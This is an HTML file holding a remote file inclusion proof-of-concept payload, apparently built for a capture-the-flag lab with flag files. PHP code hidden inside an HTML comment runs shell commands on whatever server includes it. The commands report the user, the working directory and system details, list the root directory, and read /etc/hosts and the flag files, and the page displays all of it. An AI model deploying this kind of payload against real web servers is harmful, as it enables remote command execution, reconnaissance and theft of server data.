<html>
<body>
<h1 id="header">Remote File Include Proof of Concept</h1>
<!-- Comment out the PHP code should the code not be executed server side.
<?php
    $ls_output = `ls -alG /`;
    $ls0_output = `ls /var/www/html/rfi1/`;
    $ls1_output = `ls /var/www/html/rfi2/`;
    $ls2_output = `ls /var/www/html/rfi2/You_Cant_Find_This_Dir`;
    $whoami_output = `whoami`;
    $pwd_output = `pwd`;
    $catetchosts_output = `cat /etc/hosts`;
    $catflag2_output = `cat /var/www/html/rfi2/You_Cant_Find_This_Dir/flag.php`;
    $catflag1_output = `cat /var/www/html/rfi1/flag.php`;
    $uname_a = `uname -a`;
    ECHO "--"."><p><h4> This file executes the following commands on the web server.</h4></p>";
    ECHO "<div><ol><li>Who Am I: (\"whoami\")</li>";
    ECHO "<li>Present Working Directory: (\"pwd\")</li>";
    ECHO "<li>Root file directory listing (\"ls -alG /\")</li>";
    ECHO "<li>RFI directory listing (\"ls /var/www/html/rfi1,ls /var/www/html/rfi2/\")</li>";
    ECHO "<li>Display contents of /etc/hosts: (\"cat /etc/hosts\")</li>";
    ECHO "<li>Print Out Flag: (\"cat flag.php\")</li>";
    ECHO "<li>Print Out System Infomation: (\"uname -a\")</li>";
    ECHO "<dt><b>Who Am I?</b></dt>"; 
    ECHO "<dd>".$whoami_output. "</dd>";
    ECHO "<b><dt>Present Working Directory:</dt></b>";
    ECHO "<dd>".$pwd_output."</dd>";    
    ECHO "<b><dl><dt>\"ls\" command:</dt></b>";
    ECHO "<dd><pre>" .$ls_output ."</pre></dd>";
    ECHO "<b><dl><dt>\"ls /var/www/html/rfi1/\" command:</dt></b>";
    ECHO "<dd><pre>" .$ls0_output ."</pre></dd>";
    ECHO "<b><dl><dt>\"ls /var/www/html/rfi2/\" command:</dt></b>";
    ECHO "<dd><pre>" .$ls1_output ."</pre></dd>";
    ECHO "<b><dl><dt>\"ls /var/www/html/rfi2/You_Cant_Find_This_Dir\" command:</dt></b>";
    ECHO "<dd><pre>" .$ls2_output ."</pre></dd>";
    ECHO "<b><dt>Contents of /etc/hosts:</dt></b>";
    ECHO "<dd><pre>".$catetchosts_output."</pre></dd>";
    ECHO "<b><dt>Contents of /var/www/html/rfi2/You_Cant_Find_This_Dir/flag.php:</dt></b>";
    ECHO "<dd><pre>".$catflag2_output."</pre></dd>";
    ECHO "<b><dt>Contents of /var/www/html/rfi1/flag.php:</dt></b>";
    ECHO "<dd><pre>".$catflag1_output."</pre></dd>";
    ECHO "<b><dt>uname -a:</b></dt>";
    ECHO "<dd>".$uname_a."</dd>";
?>
-->
</body>
</html>
